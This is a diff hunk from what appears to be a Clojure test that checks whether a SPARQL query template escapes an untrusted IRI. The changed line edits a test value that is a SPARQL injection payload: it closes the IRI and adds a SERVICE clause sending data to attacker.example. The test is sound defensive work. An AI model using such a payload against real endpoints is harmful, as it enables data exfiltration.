@@ -23,7 +23,7 @@
     ;; returned — untrusted. Unescaped, the `>` below would close the IRIREF and
     ;; the rest would parse as query syntax, grafting a SERVICE clause that
     ;; exfiltrates data to an external endpoint.
-    (let [evil  "https://ex.org/A> } UNION { ?s ?p ?o . SERVICE <http://attacker.example/> { ?s ?p ?o } #"
+    (let [evil  "https://example.org/A> } UNION { ?s ?p ?o . SERVICE <http://attacker.example/> { ?s ?p ?o } #"
           query (templates/class-properties-query evil)
           ;; the IRIREF token: everything up to the first *unencoded* `>`
           iri   (second (re-find #"\?instance a (<[^>]*>)" query))]
